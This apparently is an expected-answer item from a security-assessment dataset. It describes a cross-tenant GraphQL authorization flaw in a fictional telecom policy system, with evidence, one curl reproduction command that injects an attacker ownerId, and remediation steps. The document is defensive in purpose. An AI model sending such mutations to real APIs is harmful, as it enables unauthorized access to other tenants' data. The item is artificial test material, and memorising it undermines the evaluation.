# Expected Response

## System
- **Domain:** Telecom / Policy Control
- **System:** SpectreNet Policy Control
- **Example ID:** GQL-0215

## Priority Findings

### Finding 1: Telecom — Schema/Relationship Over-Exposure via updateResource Enables Cross-Tenant Policy Data Access (Pattern 6.1)
**Severity:** High
**Category:** Misconfiguration / Schema/Relationship Over-Exposure

**Summary:**
Per §4.0 (RISK-GQL-215): The `getResource` resolver fetches by `resourceId` only, without verifying `tenantId` ownership. Per §5.0 (Pattern 6.1 — schema/relationship over-exposure): the GraphQL schema exposes relationship fields including `ownerId` in mutation input types, and `tenantId`/`sensitiveField` in response types, enabling cross-tenant policy data access via schema traversal. An attacker from `tenant-e7ea` submitted `updateResource(id: "R-2215", input: {status: "approved", ownerId: "attacker-e7ea0912"})` against a policy resource belonging to `tenant-0912`, receiving `CONFIDENTIAL-e7ea0912`. In Telecom / Policy Control, cross-tenant access to network policy configurations and subscriber data enables service disruption and privacy violation.

**Evidence from HAR:**
- Request: `POST https://api.spectrenet-policy-co.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-e7ea`
- Mutation: `updateResource(id: "R-2215", input: {status: "approved", ownerId: "attacker-e7ea0912"}) { resourceId status }`
- Response `200 OK`: `tenantId: "tenant-0912"`, `ownerId: "other-user-e7ea0912"`, `sensitiveField: "CONFIDENTIAL-e7ea0912"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-e7ea0912`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-215 | getResource resolver lacks tenantId ownership check |
| context.txt §5.0 | Pattern 6.1 | Schema/relationship over-exposure via mutation input |
| HAR mutation | input.ownerId | attacker-e7ea0912 (client-injected) |
| HAR response | tenantId | tenant-0912 returned to tenant-e7ea |
| HAR response | sensitiveField | CONFIDENTIAL-e7ea0912 |
| HAR header | x-request-id | req-e7ea0912 |

## Steps to Reproduce

### Step 1 — updateResource schema over-exposure telecom policy (HAR)
```bash
curl -s -X POST https://api.spectrenet-policy-co.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-e7ea" \
  -d '{"query": "mutation { updateResource(id: \"R-2215\", input: {status: \"approved\", ownerId: \"attacker-e7ea0912\"}) { resourceId status } }"}'
```
**Vulnerable:** Returns `tenant-0912` policy data including `CONFIDENTIAL-e7ea0912`. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE resource_id = $id AND tenant_id = $jwt.tenantId`.
2. Remove `ownerId` and `tenantId` from all mutation input types in the schema.
3. Disable introspection in production to prevent schema enumeration.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
